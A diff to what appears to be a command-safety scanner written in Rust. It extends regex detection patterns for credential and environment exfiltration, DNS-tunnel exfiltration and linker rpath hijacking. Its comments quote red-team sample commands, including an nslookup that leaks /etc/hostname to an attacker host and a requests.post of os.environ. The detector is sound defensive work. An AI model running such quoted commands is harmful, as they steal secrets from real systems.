@@ -386,10 +386,21 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // -d @/path pattern only sees literal file operands.
             (
                 Regex::new(
-                    r#"(?i)(requests\.(post|put|patch)|subprocess\.(run|call|popen|check_output)|urlopen|fetch\s*\()\s*\([^)]*open\s*\(\s*['"]/(etc|var|root|proc|home)/"#,
+                    r#"(?i)(requests\.(post|put|patch)|subprocess\.(run|call|popen|check_output)|urlopen|fetch\s*\(|sendall|sendto)\s*\([^)]*open\s*\(\s*['"]/(etc|var|root|proc|home)/"#,
                 )
                 .expect("Invalid regex"),
                 "system file read embedded in network call (exfiltration)",
+            ),
+            // Whole environment posted via an interpreter network call
+            // (red-team wave-95: \`requests.post(url, data=os.environ)\`)
+            // — the open() form above needs a file; os.environ IS the
+            // credential store.
+            (
+                Regex::new(
+                    r"(?i)(requests\.(post|put|patch)|urlopen|fetch\s*\()\s*\([^)]*os\.environ",
+                )
+                .expect("Invalid regex"),
+                "environment posted via interpreter network call (exfiltration)",
             ),
             // $(env) substitution feeding a network tool (wave-20:
             // `echo $(env) | sed … | base64 -w0 | curl -d @- URL`).
@@ -403,7 +414,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // Bounded [\s\S] span: a JSON-\n newline inside a quoted arg
             // must not shield the downstream curl from the match.
             (
-                Regex::new(r"\$\(\s*cat\s+/(etc|var|root|proc)/[^)]*\)[\s\S]{0,300}(curl|wget|nc|ncat)\b")
+                Regex::new(r"\$\(\s*cat\s+/(etc|var|root|proc)/[^)]*\)[\s\S]{0,300}(curl|wget|nc|ncat|dig|nslookup|host)\b")
                     .expect("Invalid regex"),
                 "system file substitution posted to network (exfiltration)",
             ),
@@ -454,7 +465,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // are outside the /(etc|var|root) system-file pattern.
             (
                 Regex::new(
-                    r"(cat|head|tail|dd|ls)\s+[^|\n]*?~/\.(bash_history|ssh|aws|gnupg|netrc|gitconfig|kube|docker|npmrc)\S*\s*(\||;|&&)[\s\S]{0,300}(curl|wget|nc|ncat)\b",
+                    r"(cat|head|tail|dd|ls)\s+[^|\n]*?~/\.(bash_history|ssh|aws|gnupg|netrc|gitconfig|kube|docker|npmrc)\S*\s*(\||;|&&)[\s\S]{0,300}(curl|wget|nc|ncat|dig|nslookup|host)\b",
                 )
                 .expect("Invalid regex"),
                 "sensitive home file piped to network tool (exfiltration)",
@@ -464,7 +475,7 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
             // pattern covered etc/var/root only.
             (
                 Regex::new(
-                    r"(cat|head|tail|dd)\s+[^|\n]*?/proc/\S*\s*(\||;|&&)[^\n]*(curl|wget|nc|ncat)\b",
+                    r"(cat|head|tail|dd)\s+[^|\n]*?/proc/\S*\s*(\||;|&&)[^\n]*(curl|wget|nc|ncat|dig|nslookup|host)\b",
                 )
                 .expect("Invalid regex"),
                 "/proc read piped to network tool (exfiltration)",
@@ -583,6 +594,18 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 )
                 .expect("Invalid regex"),
                 "compiler flag injection via build env (CFLAGS -include)",
+            ),
+            // Runtime library-search hijack via linker flags (red-team
+            // wave-95: LDFLAGS='-Wl,-rpath,/tmp' — the built binary
+            // loads .so from the rpath at runtime, the build-time twin
+            // of LD_LIBRARY_PATH. World-writable, relative, or home
+            // rpaths only; /usr/lib-style rpaths are everyday.
+            (
+                Regex::new(
+                    r#"(?i)\bldflags\s*=\s*['"]?[^'";|\n]*-rpath[,=\s]+(/tmp|/dev/shm|\.|~)"#,
+                )
+                .expect("Invalid regex"),
+                "runtime library path hijack via LDFLAGS -rpath",
             ),
             // Credential-file harvesting by extension (red-team wave-73:
             // \`find / -name '*.pem' -o -name '*.key' | xargs cat\`) — the
@@ -875,10 +898,22 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                     // literal newline inside a quoted arg can't shield the
                     // downstream curl (wave-17's printf case; wave-20's
                     // `tr -d '\n'` chains).
-                    r"(cat|head|tail|dd|ls|find)\s+[^|\n]*?/(etc|var|root|home)(/\S*)?\s*(\||;|&&)[\s\S]{0,300}(curl|wget|nc|ncat)\b",
+                    r"(cat|head|tail|dd|ls|find|grep|rg)\s+[^|\n]*?/(etc|var|root|home|app/(\.env|config|secrets))(/\S*)?[^|\n]*(\||;|&&)[\s\S]{0,300}(curl|wget|nc|ncat|dig|nslookup|host)\b",
                 )
                 .expect("Invalid regex"),
                 "system file piped to network tool (exfiltration)",
+            ),
+            // Sensitive substitution inside a DNS query argument (red-team
+            // wave-95: \`nslookup -type=txt exfil.$(cat /etc/hostname).
+            // attacker.org\`) — the substitution-then-network patterns
+            // assume encode-first ordering; DNS tools take the payload IN
+            // the query name.
+            (
+                Regex::new(
+                    r"(?i)(dig|nslookup|host)\s+[^|\n]*\$\(\s*(cat|env|base64)\b[^)]*/(etc|var|root|proc|home)",
+                )
+                .expect("Invalid regex"),
+                "sensitive substitution inside DNS query (exfiltration)",
             ),
             (
                 Regex::new(r"(nslookup|dig|host)\s+[^\n]*base64").expect("Invalid regex"),
